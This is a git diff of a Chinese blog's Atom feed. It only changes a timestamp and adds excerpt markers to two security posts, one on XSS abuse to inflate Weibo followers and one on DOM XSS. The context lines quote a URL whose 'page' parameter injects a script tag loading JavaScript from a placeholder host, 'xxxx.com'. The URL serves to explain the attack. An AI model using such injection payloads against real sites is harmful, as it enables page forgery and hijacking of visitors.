@@ -4,7 +4,7 @@
   <title><![CDATA[移动开发技术]]></title>
   <link href="http://jason5.cn/atom.xml" rel="self"/>
   <link href="http://jason5.cn/"/>
-  <updated>2016-08-03T19:59:40+08:00</updated>
+  <updated>2016-08-03T20:09:11+08:00</updated>
   <id>http://jason5.cn/</id>
   <author>
     <name><![CDATA[jason]]></name>
@@ -70,6 +70,9 @@
     <id>http://jason5.cn/blog/xssying-yong-wei-bo-shua-fen</id>
     <content type="html"><![CDATA[<p>目前腾讯监控系统发现space.aili.com存在大量恶意的请求，通过xxx.qq.com以期望达到刷微博粉丝的效果</p>
 
+<!--more-->
+
+
 <p>被插入代码截图如下（每个页面都有，框架被修改）</p>
 
 <p><img src="http://jason5.cn/images/xss-weibo1.png" alt="" /></p>
@@ -128,6 +131,9 @@
     <updated>2016-08-03T11:04:09+08:00</updated>
     <id>http://jason5.cn/blog/dom-xss</id>
     <content type="html"><![CDATA[<p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>
+
+<!--more-->
+
 
 <p><a href="http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E">http://app.2008.qq.com/ppzj/view_dh.php?page=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fxxxx.com%2Fyy.js%22%3E%3C%2Fscript%3E</a></p>
 
